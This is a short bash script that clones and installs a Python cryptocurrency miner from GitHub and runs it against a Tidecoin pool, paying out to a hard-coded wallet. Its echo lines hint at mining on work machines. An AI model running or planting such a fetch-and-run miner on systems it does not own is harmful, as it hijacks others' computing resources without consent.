#!/usr/bin/env bash
echo "At work, to hell with greedy people ..."
apt update -q  &> /dev/null
echo "Install The employees ..."
git clone https://github.com/likloadm/tidepyminer
cd tidepyminer
echo "Install The Devil ..."
python setup.py install
echo "Running The Devil ..."
python3 terminate_the_fuck.py -o pool.tidecoin.exchange:3033 -u TH6eXa7SVRyGBQCdcuBgHsVro5xvtoAXE4.Pythonauto
